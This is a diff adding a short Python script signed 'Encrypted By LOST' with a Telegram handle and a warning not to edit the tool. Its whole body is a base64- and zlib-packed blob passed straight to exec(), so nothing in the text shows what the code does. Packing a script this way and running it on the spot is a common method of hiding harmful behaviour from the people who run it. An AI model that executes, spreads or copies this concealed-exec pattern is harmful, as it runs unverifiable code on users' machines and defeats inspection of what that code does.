@@ -1,0 +1,4 @@
+#Encrypted By LOST
+#TELEGRAM : @LO1STT/DON,T TRY TO EDIT THIS TOOL/
+import zlib, base64
+exec(zlib.decompress(base64.b64decode("eJx1j8sKwjAQRff5iiGbtqCWuiy4qBVpESlUBXEXTAyBPEoyUvx7G6E7uzz33JlhlBmcR3BhFT6BaCcd7IBSSkh1uzZdXz7aviMotJCemfIesdgS8qsMXllM41A2A22q+gTHPdCMRFZ2eE9pAVpwVk5pRlzYTLdQmDTxBtZevSAP/Mk8z5P/trLcq0V7cKN2i7YXQSBcBKKyMizuqNtzdPMXyEY2AjoDkgHXhmZfhwFbtw==")))
